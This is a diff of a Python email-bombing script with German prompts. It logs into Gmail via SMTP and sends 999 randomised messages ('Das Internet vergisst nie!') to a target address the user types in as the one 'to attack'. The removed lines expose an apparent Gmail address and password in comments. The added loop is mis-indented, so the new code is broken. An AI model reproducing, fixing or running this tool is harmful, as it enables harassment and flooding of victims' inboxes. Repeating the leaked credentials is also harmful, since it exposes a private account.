@@ -4,7 +4,6 @@ from random import randint
 import smtplib
 from colored import fg, attr
 import os
-from sys import platform
 
 def boot():
     print("======================================================================")
@@ -16,14 +15,8 @@ boot()
 username = input(str("E-Mail Adresse    : "))
 password = input(str("E-Mail Passwort   : "))
 
-#catchmeifucan80085@gmail.com
-#SandKastenMeister#223
-
 def cls():
     os.system('cls')
-
-def clear():
-    os.system('clear')
 
 def server_start():
     server = smtplib.SMTP("smtp.gmail.com")
@@ -32,35 +25,18 @@ def server_start():
     server.login(username, password)
     return server
 
-def spamm():
-    if platform == "linux":
-        cls()
-        boot()
-        attack()
-    elif platform == "darwin":
-        cls()
-        boot()
-        attack()
-    elif platform == "win32":
-        cls()
-        boot()
-        attack()
-    elif platform == "win64":
-        cls()
-        boot()
-        attack()
-
-def attack(server):
+def spamm(server):
+    boot()
     emails = input(str("E-Mail zum Angreifen: "))
-    for mailanz in range(1, 1000):
-        print(f"=={mailanz}== wurden gesendet!")
-        msg = MIMEText(
-        "We will never forget!" + str(randint(1,9999))
-        )
-        msg["Subject"] = "Das Internet vergisst nie! " + str(randint(1, 9999))
-        msg["From"] = username
-        msg["To"] = emails
-        server.sendmail(username, emails, msg.as_string())
+        for mailanz in range(1, 1000):
+            print(f"=={mailanz}== wurden gesendet!")
+            msg = MIMEText(
+            "We will never forget!" + str(randint(1,9999))
+            )
+            msg["Subject"] = "Das Internet vergisst nie! " + str(randint(1, 9999))
+            msg["From"] = username
+            msg["To"] = emails
+            server.sendmail(username, emails, msg.as_string())
 
 def main():
     while True:
